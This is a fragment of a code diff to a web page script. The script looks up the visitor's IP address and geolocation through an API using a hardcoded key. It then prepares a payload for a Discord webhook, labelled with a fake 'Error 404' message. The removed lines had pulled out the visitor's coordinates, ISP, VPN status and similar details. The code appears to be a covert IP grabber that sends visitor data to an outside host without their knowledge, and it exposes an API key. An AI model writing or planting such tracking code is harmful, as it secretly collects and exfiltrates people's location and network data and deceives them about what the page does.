@@ -17,31 +17,11 @@
     // use the 'fetch' API to retrieve the user's IP address
       $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=a1ebbf04c6164dd98b527e26c57fc28c", function (data) {
         // display the IP address on the page
-        const ip = data.ip_address
-        const country = data.country
-        const flag = data.flag.emoji
-        const countrycode = data.country_code
-        const countrygeo = data.country_geoname_id
-        const continent = data.continent
-        const continentcode = data.continent_code
-        const continentgeo = data.continent_geoname_id
-        const longitude = data.longitude
-        const latitude = data.latitude
-        const vpn = data.security.is_vpn
-        const timezonename = data.timezone.name
-        const nameabbreviation = data.timezone.abbreviation
-        const currentime = data.timezone.current_time
-        const currency = data.currency.currency_name
-        const currencycode = data.currency.currency_code
-        const operateur = data.connection.autonomous_system_organization
-        const typedeco = data.connection.connection_type
-        const isp = data.connection.isp_name
-        const organame = data.connection.organization_name
 
         // get the Discord webhook URL from the meta tag
         const webhookUrl = document.querySelector('meta[name="discord-webhook"]').content;
-
-const payload = {
+        
+        const payload = {
   embeds: [{
     title: 'Error',
     description: 'Failed to connect to server. Error 404',
